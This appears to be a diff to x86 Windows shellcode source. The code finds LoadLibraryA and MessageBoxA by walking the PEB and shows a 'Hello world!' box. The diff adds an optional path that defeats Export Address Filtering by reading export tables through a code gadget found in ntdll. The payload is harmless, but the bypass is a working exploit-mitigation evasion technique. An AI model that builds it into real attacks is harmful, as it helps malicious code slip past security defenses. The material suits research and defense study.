@@ -18,10 +18,32 @@ BITS 32
 %endif
 find_hash: ; Find ntdll's InInitOrder list of modules:
     XOR     ESI, ESI                    ; ESI = 0
+%ifndef DEFEAT_EAF
     PUSH    ESI                         ; Stack = 0
+%endif
     MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
     MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
     MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
+
+%ifdef DEFEAT_EAF
+  ; The first loaded module is ntdll on x86 systems and ntdll32 on x64 systems. Both modules have this code:
+  ; ntdll32!RtlGetCurrentPeb (<no parameter info>)
+  ;     64a118000000    mov     eax,dword ptr fs:[00000018h]
+  ;     8b4030          mov     eax,dword ptr [eax+30h]
+  ;     c3              ret
+  %define MEMORY_READER_OFFSET 0x30
+      MOV     EDX, [ESI + 0x08]           ; EDX = InInitOrder[X].base_address == module
+      MOVZX   EBP, WORD [EDX + 0x3C]      ; EBX = module->pe_header_offset
+      ADD     EDX, [EDX + EBP + 0x2C]     ; EDX = module + module.pe_header->code_offset == module code
+      MOV     DH, 0xF                     ; The EAF breakpoints are in tables that are at the start of ntdll,
+                                          ; so we can avoid them easily...
+  scan_for_memory_reader:
+      INC     EDX
+      CMP     DWORD [EDX], 0xC330408B     ; EDX => MOV EAX, [EAX+30], RET ?
+      JNE     scan_for_memory_reader
+      PUSH    EDX                         ; Save &(MOV EAX, [EAX+30], RET)
+%endif
+
 next_module: ; Get the baseaddress of the current module and find the next module:
     MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
     MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]
@@ -53,29 +75,47 @@ found_MessageBoxA:
     MOV     EDX, [EBX + 0x24]           ; EDX = offset ordinals table
     ADD     EDX, EBP                    ; EDX = &oridinals table
     MOVZX   EDX, WORD [EDX + 2 * ECX]   ; EDX = ordinal number of function
+%ifdef DEFEAT_EAF
+    XCHG    EAX, EDI                    ; EDI = 0
+    LEA     EAX, [EBX + 0x1C - MEMORY_READER_OFFSET]     ; EAX = &offset address table - MEMORY_READER_OFFSET
+    POP     ECX                         ; ECX = &(ntdll:MOV EAX, [EAX+30], RET) 
+    CALL    ECX                         ; EAX = [EAX + 0x30] == [&offset address table] == offset address table
+    XCHG    EAX, EDI                    ; EDI = offset address table, EAX = 0
+    PUSH    EAX                         ; Stack = 0
+%else
     MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table
+%endif
     ADD     EDI, EBP                    ; EDI = &address table
     ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)
     TEST    ESI, ESI
-    JZ      show_MesageBoxA
+    JZ      message_box
+
+load_library:                           ; Stack = 0 (two ways of setting it, depding on DEFEAT_EAF)
     PUSH    B2DW('3', '2', ' ', ' ')    ; Stack = "er32", 0
     PUSH    B2DW('u', 's', 'e', 'r')    ; Stack = "  user32", 0
     PUSH    ESP                         ; Stack = &("  user32"), "  user32", 0
+%ifdef DEFEAT_EAF
+    ; We will need to put a copy of &(ntdll:MOV EAX, [EAX+30], RET) back on the stack for the next function:
+    XCHG    ECX, [ESP]                  ; Stack = &(ntdll:MOV EAX, [EAX+30], RET), ECX = &("  user32")
+    PUSH    ECX                         ; Stack = &("  user32"), &(ntdll:MOV EAX, [EAX+30], RET), "  user32", 0
+%endif
     CALL    EBP                         ; LoadLibraryA(&("  user32"));
     XCHG    EAX, EBP                    ; EBP = &(user32.dll)
     XOR     ESI, ESI                    ; ESI = 0
-    PUSH    ESI                         ; Stack = 0, "  user32", 0
     JMP     get_proc_address_loop
 
-show_MesageBoxA:
+message_box:
     ; create the "Hello world!" string
-    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = "rld!", 0, "  user32", 0
-    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = "o world!", 0, "  user32", 0
-    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = "Hello world!", 0, "  user32", 0
-    PUSH    ESP                         ; Stack = &("Hello world!"), "Hello world!", 0, "  user32", 0
-    XCHG    EAX, [ESP]                  ; Stack = 0, "Hello world!", 0, "  user32", 0
-    PUSH    EAX                         ; Stack = &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
-    PUSH    EAX                         ; Stack = &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
-    PUSH    ESI                         ; Stack = 0, &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0, "  user32", 0
+%ifndef DEFEAT_EAF
+    PUSH    ESI                         ; Stack = 0
+%endif
+    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = "rld!", 0
+    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = "o world!", 0
+    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = "Hello world!", 0
+    PUSH    ESP                         ; Stack = &("Hello world!"), "Hello world!", 0
+    XCHG    EAX, [ESP]                  ; Stack = 0, "Hello world!", 0
+    PUSH    EAX                         ; Stack = &("Hello world!"), 0, "Hello world!", 0
+    PUSH    EAX                         ; Stack = &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0
+    PUSH    ESI                         ; Stack = 0, &("Hello world!"), &("Hello world!"), 0, "Hello world!", 0
     CALL    EBP                         ; MessageBoxA(NULL, &("Hello world!"), &("Hello world!"), MB_OK);
     INT3                                ; Crash
